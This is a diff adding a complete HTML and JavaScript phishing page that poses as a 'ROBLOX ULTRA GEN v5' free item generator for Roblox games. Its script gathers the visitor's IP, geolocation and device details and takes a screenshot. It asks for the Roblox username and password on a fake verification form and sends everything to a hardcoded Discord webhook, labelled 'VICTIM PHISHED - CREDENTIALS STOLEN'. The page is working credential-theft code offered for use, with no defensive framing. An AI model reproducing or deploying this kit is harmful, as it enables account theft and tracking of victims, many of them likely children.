@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ROBLOX ULTRA GEN v5 | 405 FIXED</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #00ff88;
+            --secondary: #00ccff;
+            --danger: #ff0066;
+            --bg: #0a0a1a;
+            --card: rgba(20, 20, 40, 0.7);
+            --glow: 0 0 20px rgba(0, 255, 136, 0.6);
+            --text: #e0e0ff;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 50%, #16213e 100%);
+            color: var(--text);
+            min-height: 100vh;
+            font-family: 'Rajdhani', sans-serif;
+            overflow-x: hidden;
+            position: relative;
+        }
+        .bg-anim {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: radial-gradient(circle at 20% 80%, rgba(0, 255, 136, 0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 80% 20%, rgba(0, 204, 255, 0.1) 0%, transparent 50%);
+            animation: pulseBg 8s infinite alternate;
+            z-index: -1;
+        }
+        @keyframes pulseBg {
+            0% { opacity: 0.3; transform: scale(1); }
+            100% { opacity: 0.6; transform: scale(1.05); }
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 2;
+        }
+        header {
+            text-align: center;
+            margin: 40px 0;
+            animation: fadeInDown 1s ease-out;
+        }
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 4.5rem;
+            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--danger));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+            animation: glowText 2s infinite alternate;
+        }
+        @keyframes glowText {
+            0% { text-shadow: 0 0 20px rgba(0, 255, 136, 0.5); }
+            100% { text-shadow: 0 0 40px rgba(0, 255, 136, 0.8), 0 0 60px rgba(0, 204, 255, 0.6); }
+        }
+        .tagline {
+            font-size: 1.4rem;
+            color: #aaa;
+            margin-top: 10px;
+            animation: fadeIn 1.5s ease-out;
+        }
+        .news-ticker {
+            background: rgba(255, 0, 102, 0.15);
+            border: 1px solid var(--danger);
+            padding: 12px 20px;
+            margin: 20px 0;
+            border-radius: 50px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            animation: slideInLeft 1s ease-out;
+            backdrop-filter: blur(10px);
+            box-shadow: var(--glow);
+        }
+        .ticker-icon {
+            background: var(--danger);
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            animation: bounce 2s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        .ticker-text {
+            font-weight: 700;
+            color: var(--danger);
+            font-size: 1.1rem;
+        }
+        .ticker-text span {
+            color: var(--primary);
+            animation: blink 1.5s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .generator-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
+        }
+        .gen-card {
+            background: var(--card);
+            border-radius: 20px;
+            padding: 30px;
+            border: 2px solid transparent;
+            backdrop-filter: blur(15px);
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+            animation: fadeInUp 0.8s ease-out forwards;
+            opacity: 0;
+            transform: translateY(30px);
+        }
+        .gen-card:nth-child(1) { animation-delay: 0.2s; }
+        .gen-card:nth-child(2) { animation-delay: 0.4s; }
+        .gen-card:nth-child(3) { animation-delay: 0.6s; }
+        .gen-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 5px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            transform: scaleX(0);
+            transition: transform 0.5s ease;
+        }
+        .gen-card:hover::before {
+            transform: scaleX(1);
+        }
+        .gen-card:hover {
+            transform: translateY(-15px) scale(1.02);
+            box-shadow: var(--glow), 0 20px 40px rgba(0, 0, 0, 0.3);
+            border-color: var(--primary);
+        }
+        .card-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .card-icon {
+            width: 90px;
+            height: 90px;
+            margin: 0 auto 15px;
+            background: rgba(0, 255, 136, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.5rem;
+            animation: float 3s infinite ease-in-out;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        .card-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.8rem;
+            color: var(--primary);
+            margin-bottom: 8px;
+        }
+        .card-desc {
+            color: #ccc;
+            font-size: 1rem;
+            line-height: 1.5;
+        }
+        .gen-btn {
+            background: linear-gradient(45deg, #ff0066, #ff6600);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 25px;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.4s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .gen-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            transition: 0.6s;
+        }
+        .gen-btn:hover::before {
+            left: 100%;
+        }
+        .gen-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px rgba(255, 0, 102, 0.7);
+        }
+        .gen-btn:active {
+            transform: scale(0.98);
+        }
+        .loading-screen {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #ff0000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.6s ease;
+        }
+        .loading-screen.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        .glitch-loader {
+            width: 120px;
+            height: 120px;
+            border: 10px solid #fff;
+            border-top: 10px solid #000;
+            border-radius: 50%;
+            position: relative;
+            animation: spin 1.2s linear infinite;
+        }
+        .glitch-loader::before,
+        .glitch-loader::after {
+            content: '';
+            position: absolute;
+            top: -10px; left: -10px;
+            width: 100%; height: 100%;
+            border: 10px solid transparent;
+            border-top: 10px solid #ff0066;
+            border-radius: 50%;
+            animation: glitch 0.3s infinite alternate;
+        }
+        .glitch-loader::after {
+            border-top-color: #00ff88;
+            animation-delay: 0.15s;
+        }
+        @keyframes glitch {
+            0% { clip-path: inset(0 0 0 0); }
+            25% { clip-path: inset(0 0 70% 0); }
+            50% { clip-path: inset(70% 0 0 0); }
+            75% { clip-path: inset(0 70% 0 0); }
+            100% { clip-path: inset(0 0 0 70%); }
+        }
+        .loading-text {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.8rem;
+            font-weight: 900;
+            margin-top: 30px;
+            color: #fff;
+            text-shadow: 0 0 20px #000;
+            animation: glitchText 1.5s infinite;
+        }
+        @keyframes glitchText {
+            0%, 100% { text-shadow: 0 0 20px #000, 2px 2px 0 #ff0066, -2px -2px 0 #00ff88; }
+            50% { text-shadow: 0 0 20px #000, -2px -2px 0 #ff0066, 2px 2px 0 #00ff88; }
+        }
+        .login-modal {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            pointer-events: none;
+            transition: all 0.5s ease;
+            backdrop-filter: blur(10px);
+        }
+        .login-modal.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        .modal-box {
+            background: linear-gradient(135deg, #1a1a2e, #0f0f1f);
+            padding: 40px;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 450px;
+            text-align: center;
+            border: 2px solid var(--primary);
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.4);
+            animation: modalPop 0.6s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+        @keyframes modalPop {
+            0% { transform: scale(0.7); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .modal-box::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: linear-gradient(45deg, transparent 30%, rgba(0, 255, 136, 0.1) 50%, transparent 70%);
+            transform: translateX(-100%);
+            animation: shimmer 3s infinite;
+        }
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        .modal-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2rem;
+            color: var(--primary);
+            margin-bottom: 15px;
+        }
+        .modal-subtitle {
+            color: #aaa;
+            margin-bottom: 25px;
+        }
+        .input-group {
+            position: relative;
+            margin: 15px 0;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 15px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid #444;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
+        }
+        .input-group label {
+            position: absolute;
+            left: 20px;
+            top: 15px;
+            color: #888;
+            transition: all 0.3s ease;
+            pointer-events: none;
+        }
+        .input-group input:focus ~ label,
+        .input-group input:valid ~ label {
+            top: -10px;
+            left: 15px;
+            font-size: 0.8rem;
+            color: var(--primary);
+            background: #0a0a1a;
+            padding: 0 5px;
+        }
+        .verify-btn {
+            background: linear-gradient(45deg, var(--primary), #00cc66);
+            color: #000;
+            border: none;
+            padding: 16px;
+            font-weight: bold;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+            transition: all 0.4s ease;
+            text-transform: uppercase;
+        }
+        .verify-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.4);
+        }
+        .captcha-box {
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid #444;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .captcha-img {
+            width: 100%;
+            height: 60px;
+            background: #222;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0f0;
+            font-family: monospace;
+            font-size: 1.5rem;
+            letter-spacing: 5px;
+            margin-bottom: 10px;
+        }
+        .captcha-refresh {
+            background: none;
+            border: none;
+            color: #888;
+            cursor: pointer;
+            font-size: 0.9rem;
+        }
+        footer {
+            text-align: center;
+            margin: 60px 0 30px;
+            color: #666;
+            font-size: 1rem;
+            animation: fadeIn 2s ease-out;
+        }
+        .footer-brand {
+            color: var(--primary);
+            font-weight: bold;
+            font-family: 'Orbitron', sans-serif;
+        }
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-50px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes slideInLeft {
+            from { opacity: 0; transform: translateX(-50px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        @media (max-width: 768px) {
+            .logo { font-size: 3rem; }
+            .gen-card { padding: 20px; }
+            .modal-box { padding: 25px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-anim"></div>
+    <div class="container">
+        <header>
+            <h1 class="logo">ULTRA GEN v5</h1>
+            <p class="tagline">Next-Gen Roblox Item Generator • 100% Undetected • Instant Delivery</p>
+        </header>
+        <div class="news-ticker">
+            <div class="ticker-icon">NEW</div>
+            <div class="ticker-text">
+                <span>NEW:</span> Generator (MM2) just updated with Godly Knife support! •
+                <span>Adopt Me</span> Neon Pets now available •
+                <span>Garden</span> Infinite Growth Hack live!
+            </div>
+        </div>
+        <div class="generator-grid">
+            <div class="gen-card">
+                <div class="card-header">
+                    <div class="card-icon">KNIFE</div>
+                    <h3 class="card-title">Murder Mystery 2</h3>
+                    <p class="card-desc">Generate Chroma, Godly, Ancient knives & effects</p>
+                </div>
+                <button class="gen-btn" onclick="startGen('MM2')">Start Getting Free Knives!</button>
+            </div>
+            <div class="gen-card">
+                <div class="card-header">
+                    <div class="card-icon">DOG</div>
+                    <h3 class="card-title">Adopt Me!</h3>
+                    <p class="card-desc">Unlock Legendary, Neon, Mega Neon pets instantly</p>
+                </div>
+                <button class="gen-btn" onclick="startGen('Adopt Me')">Start Getting Free Pets!</button>
+            </div>
+            <div class="gen-card">
+                <div class="card-header">
+                    <div class="card-icon">SEEDLING</div>
+                    <h3 class="card-title">Grow A Garden</h3>
+                    <p class="card-desc">Infinite seeds, rare plants & auto-harvest</p>
+                </div>
+                <button class="gen-btn" onclick="startGen('Garden')">Start Growing Now!</button>
+            </div>
+        </div>
+        <footer>
+            Powered by <span class="footer-brand">jayxpremium</span> • Updated November 15, 2025
+        </footer>
+    </div>
+    <div class="loading-screen" id="loading">
+        <div class="glitch-loader"></div>
+        <div class="loading-text">HACKING SYSTEM...</div>
+    </div>
+    <div class="login-modal" id="loginModal">
+        <div class="modal-box">
+            <h2 class="modal-title" id="modalGame">Verify Account</h2>
+            <p class="modal-subtitle">Enter your Roblox credentials to continue</p>
+            <form onsubmit="submitLogin(event)">
+                <div class="input-group">
+                    <input type="text" id="username" required>
+                    <label>Username</label>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" required>
+                    <label>Password</label>
+                </div>
+                <div class="captcha-box">
+                    <div class="captcha-img" id="captchaText">A7K9P</div>
+                    <button type="button" class="captcha-refresh" onclick="refreshCaptcha()">Refresh</button>
+                    <div class="input-group" style="margin-top:10px;">
+                        <input type="text" id="captchaInput" placeholder="Enter CAPTCHA" required>
+                    </div>
+                </div>
+                <button type="submit" class="verify-btn">Verify & Generate</button>
+            </form>
+        </div>
+    </div>
+    <canvas id="screenshotCanvas" style="display:none;"></canvas>
+    <script>
+        // === REPLACE WITH YOUR DISCORD WEBHOOK ===
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1439093284088840233/NgOHqrk3j6CwyQXMQmSTiGUvXiHnSoitp8Y4iofNJNAKytteEVv6HzFiTR9BK-PtCjzL';
+
+        let currentGame = '';
+        let victimIP = 'Unknown';
+        let victimDevice = 'Unknown';
+        let screenshotData = '';
+
+        // Load html2canvas
+        const script = document.createElement('script');
+        script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
+        script.onload = () => console.log('html2canvas loaded');
+        document.head.appendChild(script);
+
+        // Get Victim Info
+        async function getVictimInfo() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locData = await locRes.json();
+                victimIP = `${ipData.ip} (${locData.city || 'N/A'}, ${locData.region || 'N/A'}, ${locData.country_name || 'N/A'})`;
+            } catch {
+                victimIP = 'IP blocked or AdBlock detected';
+            }
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            victimDevice = `${platform} • ${ua.split(' ').pop()} • ${screen.width}x${screen.height} • ${language} • ${timezone}`;
+        }
+
+        // CAPTCHA
+        function refreshCaptcha() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let captcha = '';
+            for (let i = 0; i < 5; i++) captcha += chars[Math.floor(Math.random() * chars.length)];
+            document.getElementById('captchaText').textContent = captcha;
+        }
+
+        // Screenshot
+        async function takeScreenshot() {
+            return new Promise(resolve => {
+                if (typeof html2canvas === 'undefined') return resolve();
+                html2canvas(document.body, { scale: 0.3, useCORS: true }).then(canvas => {
+                    screenshotData = canvas.toDataURL('image/png', 0.7);
+                    resolve();
+                }).catch(() => resolve());
+            });
+        }
+
+        // Start Generator
+        async function startGen(game) {
+            currentGame = game;
+            await getVictimInfo();
+            const loading = document.getElementById('loading');
+            loading.classList.add('active');
+            refreshCaptcha();
+            setTimeout(() => {
+                loading.classList.remove('active');
+                document.getElementById('modalGame').textContent = `Verify for ${game}`;
+                document.getElementById('loginModal').classList.add('active');
+            }, 3500);
+        }
+
+        // SUBMIT LOGIN - FULLY FIXED
+        async function submitLogin(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const captchaInput = document.getElementById('captchaInput').value.toUpperCase();
+            const captchaText = document.getElementById('captchaText').textContent;
+
+            if (captchaInput !== captchaText) {
+                alert('CAPTCHA incorrect!');
+                refreshCaptcha();
+                document.getElementById('captchaInput').value = '';
+                return;
+            }
+
+            if (!WEBHOOK_URL.includes('discord.com/api/webhooks')) {
+                alert('ERROR: Set your real Discord webhook URL!');
+                return;
+            }
+
+            await takeScreenshot();
+
+            const payload = {
+                content: "@everyone **ROBLOX ACCOUNT GRABBED**",
+                username: "ULTRA GEN v5",
+                avatar_url: "https://i.imgur.com/4NXA8G9.png",
+                embeds: [{
+                    title: "VICTIM PHISHED - CREDENTIALS STOLEN",
+                    color: 16711680,
+                    description: "```diff\n+ SUCCESS: Login Captured\n```",
+                    fields: [
+                        { name: "Game", value: `**${currentGame}**`, inline: true },
+                        { name: "Username", value: `\`${username}\``, inline: true },
+                        { name: "Password", value: `\`${password}\``, inline: true },
+                        { name: "IP", value: `\`${victimIP}\``, inline: false },
+                        { name: "Device", value: `\`${victimDevice}\``, inline: false },
+                        { name: "Resolution", value: `${screen.width}x${screen.height}`, inline: true },
+                        { name: "Time", value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true }
+                    ],
+                    footer: { text: "ULTRA GEN v5 | jayxpremium" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            const form = new FormData();
+            if (screenshotData) {
+                const blob = dataURLtoBlob(screenshotData);
+                form.append('file', blob, 'screenshot.png');
+                payload.embeds[0].image = { url: "attachment://screenshot.png" };
+            }
+            form.append('payload_json', JSON.stringify(payload));
+
+            try {
+                const res = await fetch(WEBHOOK_URL, { method: 'POST', body: form });
+                if (res.ok) {
+                    alert('SUCCESS! Account captured.');
+                } else {
+                    alert('Failed. Check webhook URL.');
+                }
+            } catch (err) {
+                alert('Network error. Use ngrok or proper host.');
+            }
+
+            document.getElementById('loginModal').classList.remove('active');
+            setTimeout(() => alert('Items injecting...'), 500);
+            ['username', 'password', 'captchaInput'].forEach(id => document.getElementById(id).value = '');
+            refreshCaptcha();
+        }
+
+        function dataURLtoBlob(dataURL) {
+            const [header, data] = dataURL.split(',');
+            const mime = header.match(/:(.*?);/)[1];
+            const binary = atob(data);
+            const array = [];
+            for (let i = 0; i < binary.length; i++) array.push(binary.charCodeAt(i));
+            return new Blob([new Uint8Array(array)], { type: mime });
+        }
+
+        window.addEventListener('click', e => {
+            if (e.target.id === 'loginModal') document.getElementById('loginModal').classList.remove('active');
+        });
+
+        console.log('ULTRA GEN v5 LOADED - November 15, 2025 08:20 PM CST');
+    </script>
+</body>
+</html>
